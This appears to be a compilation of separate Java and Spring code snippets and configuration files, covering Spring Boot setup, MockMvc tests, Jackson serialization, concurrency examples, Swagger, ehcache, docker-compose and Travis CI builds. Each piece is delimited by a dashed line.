org.springframework.boot.autoconfigure.jdbc.DataSourceBeanCreationFailureAnalyzer,\
org.springframework.boot.autoconfigure.jdbc.HikariDriverConfigurationFailureAnalyzer,\
org.springframework.boot.autoconfigure.session.NonUniqueSessionRepositoryFailureAnalyzer

# Template availability providers
org.springframework.boot.autoconfigure.template.TemplateAvailabilityProvider=\
org.springframework.boot.autoconfigure.freemarker.FreeMarkerTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.mustache.MustacheTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.thymeleaf.ThymeleafTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.web.servlet.JspTemplateAvailabilityProvider
--------------------------------------------------------------------------------------------------------
group 'org.aze.accountingprogram'
version '1.0-SNAPSHOT'

apply plugin: 'java'
apply plugin: 'idea'
apply plugin: 'war'
apply plugin: 'spring-boot'

allprojects {
    sourceCompatibility = '1.8'
    targetCompatibility = '1.8'
}

repositories {
    mavenCentral()
}

buildscript {
    repositories {
        jcenter()
    }

    dependencies {
        classpath("org.springframework.boot:spring-boot-gradle-plugin:1.3.2.RELEASE")
    }
}

dependencies {
    compile("org.springframework.boot:spring-boot-starter")
    compile("org.springframework.boot:spring-boot-starter-web")
//    compile("org.springframework.boot:spring-boot-starter-jdbc")
//    runtime("mysql:mysql-connector-java")
    compile("org.springframework.boot:spring-boot-starter-logging")
    compile("javax.servlet:jstl")
    providedRuntime("org.apache.tomcat.embed:tomcat-embed-jasper")
    providedRuntime("org.springframework.boot:spring-boot-starter-tomcat")
    testCompile("org.springframework.boot:spring-boot-starter-test")
    testCompile group: 'junit', name: 'junit', version: '4.11'
}

configurations {
    compile.exclude group: 'commons-logging'
    compile.exclude group: 'org.apache.logging.log4j'
    compile.exclude group: 'log4j'
    providedRuntime
}

war {
    archiveName = 'AZEAccountingProgram.war'
    destinationDir = file('dist')
}

idea {
    project {
        //if you want to set specific jdk and language level
        jdkName = '1.8'
        languageLevel = '1.8'
    }
    module {
        //if you love browsing Javadoc
        downloadJavadoc = true
        jdkName = '1.8'
        excludeDirs += file('.nb-gradle')
        excludeDirs += file('.gradle')
        excludeDirs += file('out')
        excludeDirs += file('gradle')
        excludeDirs += file('build')
        excludeDirs += file('dist')
    }
}
--------------------------------------------------------------------------------------------------------
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = ValidateRequestBodyController.class)
class ValidateRequestBodyControllerTest {

  @Autowired
  private MockMvc mvc;

  @Autowired
  private ObjectMapper objectMapper;

  @Test
  void whenInputIsInvalid_thenReturnsStatus400() throws Exception {
    Input input = invalidInput();
    String body = objectMapper.writeValueAsString(input);

    mvc.perform(post("/validateBody")
            .contentType("application/json")
            .content(body))
            .andExpect(status().isBadRequest());
  }
}
--------------------------------------------------------------------------------------------------------
## swagger-codegen

UploadedImage:
    type: object
    properties:
      data:
        type: string
        format: byte
      mime_type:
        type: string
        enum: [image/bmp,image/jpeg,image/png]
      url:
        type: string
and I see that Swagger-codegen has generated the following class for it:

package com.github.ghost93.model;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.annotation.JsonValue;
import io.swagger.annotations.ApiModelProperty;
import java.util.Objects;
import javax.validation.constraints.Pattern;

/**
 * UploadedImage
 */
@javax.annotation.Generated(value = "io.swagger.codegen.languages.SpringCodegen", date = "2017-08-17T22:15:18.867+03:00")

public class UploadedImage {

  @JsonProperty("data")
  private byte[] data = null;
  @JsonProperty("mime_type")
  private MimeTypeEnum mimeType = null;
  @JsonProperty("url")
  private String url = null;

  public UploadedImage data(byte[] data) {
    this.data = data;
    return this;
  }

  /**
   * Get data
   *
   * @return data
   **/
  @ApiModelProperty(value = "")

  @Pattern(regexp = "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
  public byte[] getData() {
    return data;
  }

  public void setData(byte[] data) {
    this.data = data;
  }

  public UploadedImage mimeType(MimeTypeEnum mimeType) {
    this.mimeType = mimeType;
    return this;
  }

  /**
   * Get mimeType
   *
   * @return mimeType
   **/
  @ApiModelProperty(value = "")

  public MimeTypeEnum getMimeType() {
    return mimeType;
  }

  public void setMimeType(MimeTypeEnum mimeType) {
    this.mimeType = mimeType;
  }

  public UploadedImage url(String url) {
    this.url = url;
    return this;
  }

  /**
   * Get url
   *
   * @return url
   **/
  @ApiModelProperty(value = "")

  public String getUrl() {
    return url;
  }

  public void setUrl(String url) {
    this.url = url;
  }

  @Override
  public boolean equals(java.lang.Object o) {
    if (this == o) {
      return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }
    UploadedImage uploadedImage = (UploadedImage) o;
    return Objects.equals(this.data, uploadedImage.data) &&
        Objects.equals(this.mimeType, uploadedImage.mimeType) &&
        Objects.equals(this.url, uploadedImage.url);
  }

  @Override
  public int hashCode() {
    return Objects.hash(data, mimeType, url);
  }

  @Override
  public String toString() {
    StringBuilder sb = new StringBuilder();
    sb.append("class UploadedImage {\n");

    sb.append("    data: ").append(toIndentedString(data)).append("\n");
    sb.append("    mimeType: ").append(toIndentedString(mimeType)).append("\n");
    sb.append("    url: ").append(toIndentedString(url)).append("\n");
    sb.append("}");
    return sb.toString();
  }

  /**
   * Convert the given object to string with each line indented by 4 spaces (except the first
   * line).
   */
  private String toIndentedString(java.lang.Object o) {
    if (o == null) {
      return "null";
    }
    return o.toString().replace("\n", "\n    ");
  }

  /**
   * Gets or Sets mimeType
   */
  public enum MimeTypeEnum {
    BMP("image/bmp"),

    JPEG("image/jpeg"),

    PNG("image/png");

    private String value;

    MimeTypeEnum(String value) {
      this.value = value;
    }

    @JsonCreator
    public static MimeTypeEnum fromValue(String text) {
      for (MimeTypeEnum b : MimeTypeEnum.values()) {
        if (String.valueOf(b.value).equals(text)) {
          return b;
        }
      }
      return null;
    }

    @Override
    @JsonValue
    public String toString() {
      return String.valueOf(value);
    }
  }
}
--------------------------------------------------------------------------------------------------------
ObjectMapper mapper = new ObjectMapper();
SimpleModule module = 
  new SimpleModule("CustomCarSerializer", new Version(1, 0, 0, null, null, null));
module.addSerializer(Car.class, new CustomCarSerializer());
mapper.registerModule(module);
Car car = new Car("yellow", "renault");
String carJson = mapper.writeValueAsString(car);

String json = "{ \"color\" : \"Black\", \"type\" : \"BMW\" }";
ObjectMapper mapper = new ObjectMapper();
SimpleModule module =
  new SimpleModule("CustomCarDeserializer", new Version(1, 0, 0, null, null, null));
module.addDeserializer(Car.class, new CustomCarDeserializer());
mapper.registerModule(module);
Car car = mapper.readValue(json, Car.class);

ObjectMapper objectMapper = new ObjectMapper();
DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm a z");
objectMapper.setDateFormat(df);
String carAsString = objectMapper.writeValueAsString(request);
// output: {"car":{"color":"yellow","type":"renault"},"datePurchased":"2016-07-03 11:43 AM CEST"}

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.configure(DeserializationFeature.USE_JAVA_ARRAY_FOR_JSON_ARRAY, true);
Car[] cars = objectMapper.readValue(jsonCarArray, Car[].class);
// print cars

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
List<Car> listCar = objectMapper.readValue(jsonCarArray, new TypeReference<List<Car>>(){});
// print cars

import java.util.Calendar;

import lombok.Builder;
import lombok.Value;

import com.fasterxml.jackson.annotation.JsonFormat;
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.fasterxml.jackson.databind.PropertyNamingStrategy;
import com.fasterxml.jackson.databind.annotation.JsonNaming;

@Builder
@Value
@JsonNaming(PropertyNamingStrategy.SnakeCaseStrategy.class)
public class JacksonExample {
    private String fieldOne;
    @JsonIgnore
    private String fieldTwo;
    @JsonFormat(shape = JsonFormat.Shape.STRING)
    private Calendar someDate;
}
--------------------------------------------------------------------------------------------------------
public class BaeldungSynchronizedMethods {
 
    private int sum = 0;
 
    public void calculate() {
        setSum(getSum() + 1);
    }
 
    // standard setters and getters
}

@Test
public void givenMultiThread_whenNonSyncMethod() {
    ExecutorService service = Executors.newFixedThreadPool(3);
    BaeldungSynchronizedMethods summation = new BaeldungSynchronizedMethods();
 
    IntStream.range(0, 1000)
      .forEach(count -> service.submit(summation::calculate));
    service.awaitTermination(1000, TimeUnit.MILLISECONDS);
 
    assertEquals(1000, summation.getSum());
}

@Test
public void givenMultiThread_whenStaticSyncBlock() {
    ExecutorService service = Executors.newCachedThreadPool();
 
    IntStream.range(0, 1000)
      .forEach(count -> 
        service.submit(BaeldungSynchronizedBlocks::performStaticSyncTask));
    service.awaitTermination(100, TimeUnit.MILLISECONDS);
 
    assertEquals(1000, BaeldungSynchronizedBlocks.getStaticCount());
}
--------------------------------------------------------------------------------------------------------
public class SafeCounterWithoutLock {
    private final AtomicInteger counter = new AtomicInteger(0);
     
    public int getValue() {
        return counter.get();
    }
    public void increment() {
        while(true) {
            int existingValue = getValue();
            int newValue = existingValue + 1;
            if(counter.compareAndSet(existingValue, newValue)) {
                return;
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Test
public void testWorkDelegatesMethodCall() throws Exception {
    // given
    AtomicInteger counter = new AtomicInteger(0);
    MessageWorker<String, Integer> uut = new MessageWorker<String, Integer>() {
        @Override
        public Integer work(String object) {
            return counter.incrementAndGet();
        }
    };
    MessageHeaders messageHeaders = mock(MessageHeaders.class);

    // when
    uut.work("dummy value", messageHeaders);

    // then
    assertEquals(1, counter.intValue());
    verifyZeroInteractions(messageHeaders);
}
--------------------------------------------------------------------------------------------------------
@Test
public void testSendMessageToEntity() throws Exception {
    entityService.sendMessageToEntity(entity, output);

    verify(simpMessagingTemplate).convertAndSendToUser(
            eq("stompUsername"),
            eq("/queue/output"),
            eq(output),
            messageHeadersArgumentCaptor.capture());

    MessageHeaders headers = messageHeadersArgumentCaptor.getValue();
    SimpMessageHeaderAccessor accessor = SimpMessageHeaderAccessor.getAccessor(headers, SimpMessageHeaderAccessor.class);

    assertEquals("stompSessionId", accessor.getSessionId());
    assertTrue(accessor.isMutable());
}
--------------------------------------------------------------------------------------------------------
curl -X POST \
  http://localhost:8080/addToBasket \
  -H 'content-type: application/json' \
  -d '{
    "detail": {
      "product": "car",
      "code": "car-02"
    },
    "amount": 1
   }'
--------------------------------------------------------------------------------------------------------
import java.util.List;

import org.joda.time.LocalDate; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.context.request.async.DeferredResult; import org.springframework.web.servlet.config.annotation.EnableWebMvc;

import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.builders.ResponseMessageBuilder; import springfox.documentation.schema.ModelRef; import springfox.documentation.schema.WildcardType; import springfox.documentation.service.ApiKey; import springfox.documentation.service.AuthorizationScope; import springfox.documentation.service.SecurityReference; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spi.service.contexts.SecurityContext; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2;

import com.fasterxml.classmate.TypeResolver;

@EnableSwagger2 @Configuration @EnableWebMvc @ComponentScan("com.diginsite.microservices.web") public class Swagger2SpringBoot { @Autowired private TypeResolver typeResolver;

@Bean
public Docket swaggerSpringMvcPlugin() {
    return new Docket(DocumentationType.SWAGGER_2)
            .groupName("v1-bbs")
            .select()
            .apis(RequestHandlerSelectors.any())
            .paths(PathSelectors.any())
            .build()
            .pathMapping("/")
            .directModelSubstitute(LocalDate.class, String.class)
            .genericModelSubstitutes(ResponseEntity.class)
            .alternateTypeRules(newRule(typeResolver.resolve(DeferredResult.class,
                            typeResolver.resolve(ResponseEntity.class,
                                    WildcardType.class)), typeResolver
                            .resolve(WildcardType.class)))
            .useDefaultResponseMessages(false)
            .globalResponseMessage(RequestMethod.GET,
                    newArrayList(new ResponseMessageBuilder().code(500)
                            .message("500 message")
                            .responseModel(new ModelRef("Error")).build()))
            .securitySchemes(newArrayList(apiKey()))
            .securityContexts(newArrayList(securityContext()));
}

private ApiKey apiKey() {
    return new ApiKey("mykey", "api_key", "header");
}

private SecurityContext securityContext() {
    return SecurityContext.builder().securityReferences(defaultAuth())
            .forPaths(PathSelectors.regex("/anyPath.*")).build();
}

List<SecurityReference> defaultAuth() {
    AuthorizationScope authorizationScope = new AuthorizationScope(
            "global", "accessEverything");
    AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
    authorizationScopes[0] = authorizationScope;
    return newArrayList(new SecurityReference("mykey", authorizationScopes));
	}
}
--------------------------------------------------------------------------------------------------------
 git -c core.quotepath=false -c log.showSignature=false rm --cached -f -- service/src/test/resources/application-regex.yaml
 git -c core.quotepath=false -c log.showSignature=false checkout HEAD -- service/src/test/resources/application-regex.yaml
--------------------------------------------------------------------------------------------------------
<config xmlns='http://www.ehcache.org/v3' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:jsr107="http://www.ehcache.org/v3/jsr107"
    xsi:schemaLocation="http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd 
                           http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">
    <cache alias="products_list">
        <expiry>
            <ttl unit="hours">1</ttl>
        </expiry>
        <heap unit="entries">1200</heap>
        <jsr107:mbeans enable-statistics="false" />
    </cache>

</config>
--------------------------------------------------------------------------------------------------------
public void setup() {
    mvc = MockMvcBuilders
            .webAppContextSetup(context)
            .apply(springSecurity())  
            .build();
}

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.Test;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;

import eu.ubicon.webapp.test.WebappTestEnvironment;

public class Test extends WebappTestEnvironment {

    public static class MockSecurityContext implements SecurityContext {

        private static final long serialVersionUID = -1386535243513362694L;

        private Authentication authentication;

        public MockSecurityContext(Authentication authentication) {
            this.authentication = authentication;
        }

        @Override
        public Authentication getAuthentication() {
            return this.authentication;
        }

        @Override
        public void setAuthentication(Authentication authentication) {
            this.authentication = authentication;
        }
    }

    @Test
    public void signedIn() throws Exception {

        UsernamePasswordAuthenticationToken principal = 
                this.getPrincipal("test1");

        MockHttpSession session = new MockHttpSession();
        session.setAttribute(
                HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY, 
                new MockSecurityContext(principal));


        super.mockMvc
            .perform(
                    get("/api/v1/resource/test")
                    .session(session))
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class XcareVitalinqConnectorWebMvcConfigurerAdapter extends WebMvcConfigurerAdapter {

    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/webjars/**")
                .addResourceLocations(
                        "classpath:/META-INF/resources/webjars/");

        registry.addResourceHandler("/swagger-ui.html")
                .addResourceLocations(getStaticLocations());
    }

    private String[] getStaticLocations() {

        String[] result = new String[5];
        result[0] = "/";
        result[1] = "classpath:/META-INF/resources/";
        result[2] = "classpath:/resources/";
        result[3] = "classpath:/static/";
        result[4] = "classpath:/public/";

        return result;
    }
}
--------------------------------------------------------------------------------------------------------
@Override
  protected List<ConfigIssue> init() {

    URL url = MyClass.class.getResource("sample-resource.txt");
    LOGGER.info("resource url: {}",url);
    InputStream is = MyClass.class.getResourceAsStream("sample-resource.txt");
    LOGGER.info("resource stream: {}",is);

    List<ConfigIssue> issues = super.init();
    return issues;
  }
--------------------------------------------------------------------------------------------------------
@Controller
static class FaviconController {
  
    @GetMapping("favicon.ico")
    @ResponseBody
    void returnNoFavicon() {
    }
}
--------------------------------------------------------------------------------------------------------
import lombok.experimental.ExtensionMethod;

@ExtensionMethod({java.util.Arrays.class, Extensions.class})
public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    intArray.sort();
    
    String iAmNull = null;
    return iAmNull.or("hELlO, WORlD!".toTitleCase());
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}


 public class ExtensionMethodExample {
  public String test() {
    int[] intArray = {5, 3, 8, 2};
    java.util.Arrays.sort(intArray);
    
    String iAmNull = null;
    return Extensions.or(iAmNull, Extensions.toTitleCase("hELlO, WORlD!"));
  }
}

class Extensions {
  public static <T> T or(T obj, T ifNull) {
    return obj != null ? obj : ifNull;
  }
  
  public static String toTitleCase(String in) {
    if (in.isEmpty()) return in;
    return "" + Character.toTitleCase(in.charAt(0)) +
        in.substring(1).toLowerCase();
  }
}
--------------------------------------------------------------------------------------------------------
notifications:
 - !employee.notifications.NotificationWrapper
   regionName: employee
   listeners:
      - !employee.notifications.NotificationListener
        classpath: employee.view.EmployeeTableView
        method: setData
 - !employee.notifications.NotificationWrapper
   regionName: course
   listeners:
      - !employee.notifications.NotificationListener
        classpath: CourseTableView
        method: loadData
--------------------------------------------------------------------------------------------------------
version: '3.2'
services:
  proxy: 
    image: nginx:1.13-alpine
    volumes:
      - ./proxy/conf/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./proxy/conf/domain.conf:/etc/nginx/domain.conf:ro
    ports:
      - "80:80"
    depends_on:
      - webapp
  database:
    image: mysql:5.7
    volumes:
      - ./database/db:/docker-entrypoint-initdb.d/:ro
      - ./database/data:/var/lib/mysql:rw
    environment:
      - MYSQL_ROOT_PASSWORD=${DB_ROOT_PASSWORD}
      - MYSQL_USER=${DB_USER}
      - MYSQL_PASSWORD=${DB_PASSWORD}
      - MYSQL_DATABASE=${DB_DATABASE}
  webapp:
    build: webapp
    image: webapp
    environment:
      - DB_HOST=${DB_HOST}
      - DB_USER=${DB_USER}
      - DB_PASSWORD=${DB_PASSWORD}
      - DB_DATABASE=${DB_DATABASE}
    depends_on:
      - database
--------------------------------------------------------------------------------------------------------
language: java
sudo: false

install:
  -

matrix:
  fast_finish: true
  include:
    - jdk: oraclejdk8
      env:
        - DESC="releasenotes-builder"
        - CMD="cd releasenotes-builder && mvn clean verify && mvn clean compile package"

    - jdk: oraclejdk8
      env:
        - DESC="patch-diff-report-tool"
        - CMD="cd patch-diff-report-tool && mvn clean install"

    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (launch.groovy) on linux "
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && mvn clean install -Passembly"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy launch.groovy -l projects-for-travis.properties -c my_check.xml -i"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -c my_check.xml -b master -p patch-branch -r ../checkstyle"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux with base and patch configs"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -bc my_check.xml -pc my_check.xml -b master -p patch-branch -r ../checkstyle"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="checkstyle-tester (diff.groovy) on linux with enabled patchOnly"
        - CMD1=" git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
        - CMD2=" && git checkout -b patch-branch"
        - CMD3=" "
        - CMD4=" "
        - CMD5=" && cd ../checkstyle-tester"
        - CMD6=" && groovy diff.groovy -l projects-for-travis.properties -pc my_check.xml -p patch-branch -r ../checkstyle -m single"
        - CMD=$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6
    - jdk: oraclejdk8
      env:
        - DESC="codenarc validation for groovy files"
        - CMD1=" cd checkstyle-tester "
        - CMD2=" && ./codenarc.sh . diff.groovy > diff.log && cat diff.log && grep '(p1=0; p2=8; p3=0)' diff.log"
        - CMD3=" && ./codenarc.sh . launch.groovy > launch.log && cat launch.log && grep '(p1=0; p2=21; p3=1)' launch.log"
        - CMD4=" "
        - CMD=$CMD1$CMD2$CMD3$CMD4
    # disable as for now java8 is not supoorted jdk for travis MacOS
    #- os: osx
    #  env:
    #    - DESC="checkstyle-tester on MacOS"
    #    - CMD0="export JAVA_HOME=$(/usr/libexec/java_home) "
    #    - CMD1=" && git clone https://github.com/checkstyle/checkstyle && cd checkstyle "
    #    - CMD2=" && mvn clean install -Passembly"
    #    - CMD3=" "
    #    - CMD4=" "
    #    - CMD5=" && cd ../checkstyle-tester && cp projects-for-travis.properties projects-to-test-on.properties "
    #    - CMD6=" && ./launch.sh -Dcheckstyle.config.location=my_check.xml "
    #    - CMD=$CMD0$CMD1$CMD2$CMD3$CMD4$CMD5$CMD6

script: eval $CMD

after_success:

cache:
  directories:
  - ~/.m2

branches:
  only:
    - master
--------------------------------------------------------------------------------------------------------
matrix:
  include:
    - jdk: oraclejdk8
      env: DO_AFTER_SUCCESS=true
    - jdk: oraclejdk9
    # We can't test on Java 10. OpenJDK 10 doesn't include JavaFX (and there's no good way to install it). Oracle JDK 10 (which includes JavaFX) is no longer supported by Travis.
    - jdk: openjdk11
      env: REPLACE_CACERTS=true

language: java

branches:
  only:
  - master
  - develop

addons:
  apt:
    packages:
    - pandoc
  sonarcloud:
    organization: prob2

env:
  global:
  - secure: ghArb+3bPNLUtjyRhQdUIcAXIOxBWPz//dg/VDw4kHbsLgWQ+9AcdnetZ6S0C7OHqm1gTx/YJI5aolMIjsAHpMzgsUIlzbvtfdI54RWp76jaCvhqOjYApjQMOOKDtvPE0mIWhfm2FaX7e+v9SKeyAWWiLoiUxJAf9DsQcKEY4dXVSgIlU8DQGVYOn426pcjoUtTsVqdmNpcytdtQE/Eax8WNLU5gythSarZ/jopZO+WCZPRVCCalhDJ3jHRSCPAtKtKG7vijRL50b7lPDtVqMKHYwbMhPgRnTRVT9HTc0oxVCHDIuoTwMb7JBIdBIAh1BaJBcEkoKaPAOmAIMnVHcNDaPj6YVMocZhVllNA51qwOBeeI+l+1slJhK0iUILVNEqmkHxL/QMnjxYAPY1CYrTCMbkyOCU/gBi7Fx1x9yUe2Zm81+T4MJD3aW7fLM/3PxWcDPupUia5u0PBlXI3KznIyb8zE6qSRoNIla15OMx+X9XXSv/6KbPlWceQC4ITNt7oBkIlN1+zcI29qf/q08CT72TP5z8y6py3roMIQ7knCGjmS+YO58Bq6+r260VOW7btLHSzAJd/8N8tINzVGBBztPl0ytVVD7AJgflM2rTm3FTDPNnOcZLPtb2+5haXXd4af0+au5+Ovx9LTSK9d6jCAAl8RkIAwR+mNVWrhrVQ=
  - secure: FOWN70kC1DijANcdPHPO6CqKmuvpSef3snEDrStABtyEnhwKpARHti9NesvzK6LmFWJVb5v9CZ5NikLDxslSnmecHI97FQRPZfrXAnZB+z9LQd3GThYbR/jxPmyz9ohojmEJSN3EWWbwW469TWhelfLtZc2z187dCpFfeL11VP/S8EKK0c34vffC0poD46+AMXmnFwSP5Qdesvn+ZqndSlANqdSgWQ3+Ku1bP/D0vNlw2RW9cUvdsADQZyAGnBb1kL04sZ0iiy0s6CSMBkgLM2izvc/eqb3SPcSxfMIm3QIV7CWNeTlUn/Yq6aXEA3WJm+7xYWzaOi3gUA2bfNeD6wDkdDyFk0KWuNBSBtX4i17lghKO0RExkpWKqnKvpr/zwoKYjkgzjq8T3Ho22EoWXljeD7iAkpbf8BUVmTRmNSM3uUpUWjAw2lLSJvPrk1dEGlREreSk10QHM6Fin+99kAnWdU9D9QXP0z6iMAD+OFW0DgzOjxBWBuJPGJHYdhoxJd94S+u4j1CDsFouA49gOvm2qi55LYsCm0DLfPSotQ10s24Jc0UlyCMXhdhZnSWLDYGZ604N0BXaNbAZ+uu4tc0WK4kUY1H1pB5hHEAAbae2TWewQTINLxPwt5Nrm/H72LZMnWz2IJNOPNO2IlgMl0h18YgNeZwJxFbp7yDe+Ik=
  - secure: c+NGBCkOS0FTkW0/VZdLpMq280LO89hfJrLrPp6vxjgLBvzo4ai8qz4Z4pUE34/z5V/LiT6LdvkEI6WQIWdqU5UqBX7PyN66/Da4wtPLxqeTRv0giEXmziSRcePhdJzHxujCSU6a3ANZqSU+weeaqLHyyhuenDNvmXRz2vZLOIBxSzPDpOCm3bBV0BShutn/+zJHX/xW1mRrCZ24n2mL2rD/plYK7Ipc4+S5f7alSeQVHcYs5LTIyV2eGTU58XLaZorjFHKk7YA0HkU0fWDs3Jh28JSsVGKY3Ssj4lhHqrS/NqHBzjoWb8d7EOPnUWFp9bjRk/ia5gtUF8Ev6ljJGnnkbc/Kt2XdJNR0uRn2dnfaBVHmzpSRZZnx4b5MLg/ET8UZKIlee3ZupJEVPWWurmD52iXhm/tAD5YxIcSVg1SSYE9lF3uBZgb43Cf/txbuU9zY+VqkgwR9v1i2C0J+JOQSX4jYcuRJd1fQbhcSSbbkaitz/q7LQmZ1Nx+0Oilw94+oc0n3q+ye+km+gYb2g6VqFf+ooVKe0W7b8hxPvdRBKTnBduEuCnsvqWqYODcg9EGlHuJxj8EDnM3hIT+SUnyzqUS80oI71whgu8XTGJDgaTDjW0hHxKLqtFUI/Hy419/L86oklQBkJ+mrxFdyVKD9LrT/OQ4qoQAgsjeQIHE=
  - secure: R4Hg5t8plAqVlWVTUlFIf2PLaBGYur4LgPzMucRHxPI3F7HbG3/MaoINyVQ//oFnsSXBO/4LsaDz01IMGDo8shvXLi2mN3GGfVSjQx443gwWZEC34ftomYZduXikCGILlV64mdiM7lHTW4Ficu32K3FwRKrTjhtlcIKqWW8WOlSfW2QqS3E38iOe2WyjhVIj/+QObrJFdvnqPxcXOQN/MHaSOhmZ0oUJZ3EFDnvaij9nZR67V0IQr8YTCUKLP2Q+UqfWS7mJXkkhBBo7Ff425JvyaoHMogBCtdKTgftRm3TIGOlI3hiYIaLnG2esINWGeaBJ0bSFgetvcsPrwcaqN/TF6m4S+P89BMt4r2htR0q7vM6fNf5fOmyCidtWmU5bSMLusZ4WC4GT3IarMiI/faOX+W38byMsGe06tKperpP5dmkJR/QWGCYJlrmlU8/u7LTuFeeLaPx5IOGnLdqqVNk83rjj6Ws1LdVUxVcBbHu2SUGV+MFmgIpkleYgS1b9bRaUGQRagiMc4FgOOhJOhhucNnpTOXRU7mKgnuVVjMlnfm03iZXOy0NmoOLs5XPTgOD28jZQBZI7PyrGCGPch9dmIdb484N8nO2EXjulRqYeb0A7fihZ/S65gPyzYTgY+mJTDmGaIAfSXxI5id11lDcXiz9E45yxsbnAZQO1lZk=
  - secure: oaBvSWCDGimkM3H238VHCP07ZIn9kS1R8Y8F79YyWe7x8nhqH4zV2jX2EkRPQdqJrDBSsvAOzVP2Vmbrg8tOxpx622sjfOAODqLmDwWEvcMfBIzZinOZTt3/LX7V9y6TwqMkRKjDfSIRvGHegrsWhnNh1sLZkBdjFVZMtUgVqxfsn3MCABQCnbkxY2DW8LxmLJAdGiqrZKzMKDbNwsq5X6/7ekVYZKIti6QSQi0paxgplK7tWxhKVIxNCNQaImOde+xGHdTdXu0sBn1IN3hND4ok8s9YcbrPtN654BKT77/bhuQ77rYkx5pxuj1Z8MgzfwFX5ynn8Wpq+qxbi49ICAms/ZBw9MxMwpYpD/B4cOXlLU5Zn4AkwNJmGZm7KFcX9HHu9qjPGswlRqx8xx8XfxWNE60FQqh0SzAGjpg/ZSFN/Jhl0QrInx8PG+Mol6XtAY/LkzLDNQds2T54ABfBexWXNiliEc0Hp9SorlXW7N5y2HwqwK4ed4nD4h5gHLglK8HS/0lZWh6TL7upI4NHQXlypSeZTR1WFeOxwPTm6rPQ+ExJv90LHe4/QXRWPw9DKDcHLd6xfxaB7OSnYgc00mZ3dX5yB6xw2T9NxjYY5xmkrv1R+n8lO7GgWuUZO7xScAyjMFvB4q2/rZAJrOqavWkfAFUn3Xbw+Qlw96NsR3g=

before_install:
# Always use the system-wide certificates (OpenJDK doesn't include the certificates needed to connect to oss.sonatype.org)
- |
  if [[ "${REPLACE_CACERTS}" == "true" ]]
  then
    rm "${JAVA_HOME}/lib/security/cacerts"
    ln -s "/etc/ssl/certs/java/cacerts" "${JAVA_HOME}/lib/security/cacerts"
  fi
install:
- rvm install 2.2.6
- gem install travis-custom-deploy

script:
- ./gradlew distZip shadowJar createAppZip --info --stacktrace --warning-mode=all

before_cache:
- rm -f $HOME/.gradle/caches/modules-2/modules-2.lock
- rm -fr $HOME/.gradle/caches/*/plugin-resolution/

cache:
  directories:
